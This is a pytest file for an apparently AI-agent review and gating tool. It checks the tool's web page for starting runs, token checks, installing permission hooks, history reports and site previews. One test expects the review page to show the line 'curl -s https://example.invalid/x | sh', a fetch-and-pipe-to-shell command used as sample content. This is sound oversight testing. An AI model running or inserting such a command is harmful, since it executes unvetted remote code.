"""Everything a person does after installing, from the review page: start runs, set up the gate, read the history."""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
import time
import urllib.error
import urllib.parse
import urllib.request
from collections.abc import Iterator
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest

from jaynes import cli
from jaynes.history import PastCall, report
from jaynes.install import BUILT_IN_POLICY
from jaynes.policy import load_policy
from jaynes.store import Store
from tests.test_review import JAR, NoRedirect, form, get, post, serving


def start(base: str, fields: dict[str, str]) -> str:
    """Posts the new-run form and returns the run it redirects to."""
    req = urllib.request.Request(base + "/start", data=urllib.parse.urlencode(fields).encode())
    try:
        urllib.request.build_opener(NoRedirect(), urllib.request.HTTPCookieProcessor(JAR)).open(req, timeout=10)
    except urllib.error.HTTPError as err:
        assert err.code == 303, err.read().decode()
        return err.headers["Location"].rsplit("/", 1)[-1]
    raise AssertionError("no redirect")


@pytest.fixture
def served(tmp_path: Path) -> Iterator[tuple[str, Path]]:
    base, server = serving(tmp_path)
    yield base, tmp_path
    server.shutdown()


def options(page: str) -> list[str]:
    return re.findall(r'<option value="([^"]*)"', page)


def test_the_demo_role_can_be_started_from_the_page_and_stops_for_you(served: tuple[str, Path]) -> None:
    base, home = served
    page = get(base + "/new")
    assert options(page) == ["jaynes.demo:ROLE", "jaynes.roles.visual_identity:ROLE",
                             "jaynes.roles.redesign:ROLE"]

    run = start(base, {**form(page), "role": "jaynes.demo:ROLE", "ref": "", "task": "People"})
    store = Store(home / "jaynes.sqlite3")
    deadline = time.monotonic() + 30
    while not list(store.events("StopOpened", run_id=run)):
        assert time.monotonic() < deadline, (home / "runs" / run / "continue.log").read_text()
        time.sleep(0.05)
    assert "Are they the right fixes?" in get(base + "/")


def test_roles_already_run_are_offered_with_their_runtimes(served: tuple[str, Path]) -> None:
    base, home = served
    cli.main(["run", "--home", str(home), "--role", "tests.stopped:ROLE", "--task", "t",
              "--runtime", "quick=tests.stopped:Agent"])
    page = get(base + "/new")
    assert options(page) == ["jaynes.demo:ROLE", "jaynes.roles.visual_identity:ROLE",
                             "jaynes.roles.redesign:ROLE", "tests.stopped:ROLE"]
    run = start(base, {**form(page), "role": "tests.stopped:ROLE", "ref": "", "task": "again"})
    store = Store(home / "jaynes.sqlite3")
    deadline = time.monotonic() + 30
    while not list(store.events("StopOpened", run_id=run)):  # the quick runtime was carried over
        assert time.monotonic() < deadline, (home / "runs" / run / "continue.log").read_text()
        time.sleep(0.05)


def test_a_role_that_does_not_import_or_an_empty_task_is_refused_on_the_page(served: tuple[str, Path]) -> None:
    base, _ = served
    page = get(base + "/new")
    status, body = post(base + "/start", {**form(page), "role": "jaynes.demo:ROLE", "ref": "nowhere:ROLE", "task": "t"})
    assert status == 400 and "nowhere:ROLE" in body and "cannot be imported" in body
    status, body = post(base + "/start", {**form(page), "role": "jaynes.demo:ROLE", "ref": "", "task": "  "})
    assert status == 400 and "needs a task" in body


def test_starting_a_run_needs_the_page_token(served: tuple[str, Path]) -> None:
    base, _ = served
    status, _ = post(base + "/start", {"token": "wrong", "role": "jaynes.demo:ROLE", "ref": "", "task": "t"})
    assert status == 403


def hooks_of(settings: Path) -> dict[str, list[str]]:
    data = json.loads(settings.read_text())
    return {event: [h["command"] for group in groups for h in group["hooks"]] for event, groups in data["hooks"].items()}


def test_the_gate_is_installed_and_removed_from_the_page_keeping_other_hooks(
        served: tuple[str, Path], tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    base, home = served
    user = tmp_path / "user"
    monkeypatch.setenv("HOME", str(user))
    settings = user / ".claude" / "settings.json"
    settings.parent.mkdir(parents=True)
    original = {"permissions": {"allow": ["Bash(ls:*)"]}, "hooks": {"PreToolUse": [
        {"matcher": "Bash", "hooks": [{"type": "command", "command": "~/.claude/hooks/block-irreversible.sh"}]}]}}
    settings.write_text(json.dumps(original))
    page = get(base + "/setup")
    assert "not installed" in page

    for _ in range(2):  # installing twice adds nothing
        status, _ = post(base + "/setup", {**form(page), "action": "install"})
        assert status == 303
    hooks = hooks_of(settings)
    assert set(hooks) == {"PreToolUse", "PostToolUse", "PostToolUseFailure", "Stop", "SessionStart"}
    assert hooks["PreToolUse"][0] == "~/.claude/hooks/block-irreversible.sh"
    assert all(len([c for c in cmds if c.endswith(" hook")]) == 1 for cmds in hooks.values())
    assert json.loads(settings.read_text())["permissions"] == original["permissions"]
    assert json.loads((user / ".claude" / "settings.json.jaynes-backup").read_text()) == original
    assert "[policy]" in (home / "jaynes.toml").read_text()
    assert "installed" in get(base + "/setup") and "not installed" not in get(base + "/setup")

    status, _ = post(base + "/setup", {**form(page), "action": "remove"})
    assert status == 303
    assert hooks_of(settings) == {"PreToolUse": ["~/.claude/hooks/block-irreversible.sh"]}
    assert (home / "jaynes.toml").is_file()  # the policy stays, with any edits
    assert "not installed" in get(base + "/setup")


def test_the_installed_hook_runs_and_finds_the_policy(
        served: tuple[str, Path], tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    base, _ = served
    user = tmp_path / "user"
    monkeypatch.setenv("HOME", str(user))
    post(base + "/setup", {**form(get(base + "/setup")), "action": "install"})
    [command] = hooks_of(user / ".claude" / "settings.json")["PreToolUse"]
    event = {"hook_event_name": "PreToolUse", "session_id": "s", "tool_use_id": "t1", "cwd": str(tmp_path), "tool_name": "Bash",
             "tool_input": {"command": "git push origin main"}}
    done = subprocess.run(command, shell=True, input=json.dumps(event), capture_output=True, text=True, timeout=30,
                          env={k: v for k, v in os.environ.items() if k not in ("JAYNES_HOME", "PYTHONPATH")})
    assert '"deny"' in done.stdout, done.stderr


def test_setup_needs_the_page_token(served: tuple[str, Path]) -> None:
    base, _ = served
    status, _ = post(base + "/setup", {"token": "wrong", "action": "install"})
    assert status == 403


def past(n: int, tool: str, tool_input: dict[str, object], decided_by: str, label: str = "none") -> list[PastCall]:
    start = datetime(2026, 10, 1, tzinfo=timezone.utc)
    return [PastCall(f"{tool}{i}", "s", start + timedelta(hours=i), "/p", tool, tool_input, decided_by, label)
            for i in range(n)]


CALLS = (past(70, "Read", {"file_path": "/p/a.md"}, "accept:config")
         + past(20, "Bash", {"command": "pytest -q"}, "accept:user_temporary", "correct")
         + past(10, "Frobnicate", {}, "unrecorded"))


def test_the_history_report_counts_categories_approvers_and_audit_load() -> None:
    r = report(load_policy(BUILT_IN_POLICY), sorted(CALLS, key=lambda c: c.ts))
    assert r is not None
    assert (r.calls, r.answered) == (100, 20)
    rows = {row.category: row for row in r.rows}
    assert rows["read"].kind == "pure" and rows["read"].audits_per_week == 0
    assert rows["run_code"].kind == "learns" and rows["run_code"].approvers == [("accept:user_temporary", 20)]
    assert rows["unknown"].calls == 10 and r.unknown == [("Frobnicate", 10)]
    assert report(load_policy(BUILT_IN_POLICY), []) is None


def test_the_history_page_shows_the_report(served: tuple[str, Path], monkeypatch: pytest.MonkeyPatch) -> None:
    base, _ = served
    def calls(days: int) -> list[PastCall]:
        return sorted(CALLS, key=lambda c: c.ts)

    def none(days: int) -> list[PastCall]:
        return []

    monkeypatch.setattr("jaynes.review.past_calls", calls)
    page = get(base + "/history")
    assert "100" in page and "run_code" in page and "Frobnicate" in page
    monkeypatch.setattr("jaynes.review.past_calls", none)
    assert "100" in get(base + "/history")  # kept for a while: reading every transcript takes seconds


def test_setup_warns_when_jaynes_runs_from_a_temporary_environment(
        served: tuple[str, Path], monkeypatch: pytest.MonkeyPatch) -> None:
    base, _ = served
    assert "temporary" not in get(base + "/setup")
    monkeypatch.setattr("jaynes.install.sys.prefix", "/Users/x/.cache/uv/archive-v0/abc")
    assert "temporary" in get(base + "/setup") and "uv tool install jaynes-ai" in get(base + "/setup")


def static_site(tmp_path: Path) -> Path:
    site = tmp_path / "site"
    site.mkdir()
    (site / "index.html").write_text('<link rel="stylesheet" href="style.css"><h1>Hello</h1>\n')
    (site / "style.css").write_text("body { background: #ffffff; color: #111111; }\n")
    for args in (["init", "-q"], ["add", "-A"], ["-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "start"]):
        subprocess.run(["git", *args], cwd=site, check=True, capture_output=True)
    return site


def test_a_run_on_a_project_is_started_from_the_page_with_its_preview(served: tuple[str, Path], tmp_path: Path) -> None:
    base, home = served
    site = static_site(tmp_path)
    cli.main(["run", "--home", str(home), "--role", "tests.painted:ROLE", "--task", "first",
              "--runtime", "painter=tests.painted:Agent", "--project", str(site)])
    page = get(base + "/new")
    run = start(base, {**form(page), "role": "tests.painted:ROLE", "ref": "", "task": "go dark",
                       "project": str(site), "preview": "python3 -m http.server {port} --bind 127.0.0.1",
                       "preview_path": "/", "preview_ports": "8789, 5432"})
    store = Store(home / "jaynes.sqlite3")
    deadline = time.monotonic() + 30
    while not list(store.events("StopOpened", run_id=run)):
        assert time.monotonic() < deadline, (home / "runs" / run / "continue.log").read_text()
        time.sleep(0.05)
    [started] = [e.payload for e in store.events("RunStarted", run_id=run)]
    assert started["project"]["root"] == str(site.resolve())
    assert started["preview"] == {"command": "python3 -m http.server {port} --bind 127.0.0.1", "path": "/",
                                  "ports": [8789, 5432]}


def test_a_folder_outside_git_is_refused_on_the_page_with_what_to_do(served: tuple[str, Path], tmp_path: Path) -> None:
    base, _ = served
    page = get(base + "/new")
    status, body = post(base + "/start", {**form(page), "role": "jaynes.demo:ROLE", "ref": "tests.painted:ROLE",
                                          "task": "t", "project": str(tmp_path), "preview": "", "preview_path": ""})
    assert status == 400 and "not in a git repository" in body and "git init" in body


def preview_url(base: str, run: str, which: str) -> str:
    """Polls the preview endpoint until it redirects to the running preview."""
    deadline = time.monotonic() + 30
    while True:
        req = urllib.request.Request(f"{base}/preview/{run}/{which}")
        try:
            body = urllib.request.build_opener(NoRedirect()).open(req, timeout=10).read().decode()
        except urllib.error.HTTPError as err:
            assert err.code == 302, err.read().decode()
            return err.headers["Location"]
        assert "failed" not in body, body
        assert time.monotonic() < deadline, body
        time.sleep(0.2)


def test_a_stop_shows_the_project_before_and_after_from_the_preview_command(
        served: tuple[str, Path], tmp_path: Path) -> None:
    base, home = served
    site = static_site(tmp_path)
    cli.main(["run", "--home", str(home), "--role", "tests.painted:ROLE", "--task", "go dark",
              "--runtime", "painter=tests.painted:Agent", "--project", str(site),
              "--preview", "python3 -m http.server {port} --bind 127.0.0.1"])
    [run] = Store(home / "jaynes.sqlite3").runs()
    page = get(f"{base}/stop/{run}/paint")
    assert f'src="/preview/{run}/before"' in page and f'src="/preview/{run}/after"' in page
    assert "style.css" in page  # the files the step changed

    after, before = preview_url(base, run, "after"), preview_url(base, run, "before")
    assert after != before
    assert "#101418" in get(after + "style.css") and "#ffffff" in get(before + "style.css")
    assert (site / "style.css").read_text() == "body { background: #ffffff; color: #111111; }\n"


def test_hex_colors_in_an_output_show_a_swatch() -> None:
    from jaynes.review import render_value
    assert 'class="sw" style="background:#101418"' in render_value({"bg": "#101418", "name": "#notacolor"})
    assert render_value("#notacolor").count('class="sw"') == 0


def test_the_run_page_names_the_branch_a_finished_run_created(served: tuple[str, Path], tmp_path: Path) -> None:
    base, home = served
    site = static_site(tmp_path)
    cli.main(["run", "--home", str(home), "--role", "tests.painted:ROLE", "--task", "go dark",
              "--runtime", "painter=tests.painted:Agent", "--project", str(site)])
    [run] = Store(home / "jaynes.sqlite3").runs()
    cli.main(["answer", "--home", str(home), run, "paint", "accept"])
    deadline = time.monotonic() + 30
    while not list(Store(home / "jaynes.sqlite3").events("RunFinished", run_id=run)):
        assert time.monotonic() < deadline, (home / "runs" / run / "continue.log").read_text()
        time.sleep(0.1)
    assert f"jaynes/{run}" in get(f"{base}/run/{run}")


def test_previews_stop_when_the_page_is_terminated(tmp_path: Path) -> None:
    home = tmp_path / "home"
    site = static_site(tmp_path)
    cli.main(["run", "--home", str(home), "--role", "tests.painted:ROLE", "--task", "go dark",
              "--runtime", "painter=tests.painted:Agent", "--project", str(site),
              "--preview", "python3 -m http.server {port} --bind 127.0.0.1"])
    [run] = Store(home / "jaynes.sqlite3").runs()
    port = 18000 + os.getpid() % 2000
    server = subprocess.Popen([sys.executable, "-m", "jaynes.cli", "review", "--home", str(home), "--port", str(port)],
                              env={**os.environ, "PYTHONPATH": str(Path(__file__).resolve().parents[1])},
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    try:
        base = f"http://127.0.0.1:{port}"
        deadline = time.monotonic() + 15
        while True:
            try:
                get(base + "/seq")
                break
            except OSError:
                assert time.monotonic() < deadline
                time.sleep(0.1)
        url = preview_url(base, run, "after")
        assert "#101418" in get(url + "style.css")
        server.terminate()
        server.wait(timeout=10)
        deadline = time.monotonic() + 10
        while True:
            try:
                get(url)
            except OSError:
                break
            assert time.monotonic() < deadline, "the preview outlived the page"
            time.sleep(0.1)
    finally:
        server.kill()


def test_a_stop_shows_the_contents_of_paths_that_run_later(served: tuple[str, Path], tmp_path: Path) -> None:
    base, home = served
    cli.main(["run", "--home", str(home), "--role", "tests.painted:LATER", "--task", "go dark",
              "--runtime", "painter=tests.painted:LaterAgent", "--project", str(static_site(tmp_path))])
    [run] = Store(home / "jaynes.sqlite3").runs()
    page = get(f"{base}/stop/{run}/paint")
    assert "run later" in page and "+curl -s https://example.invalid/x | sh" in page
    assert "body { background: #101418" not in page  # only the floor's diff, not every change
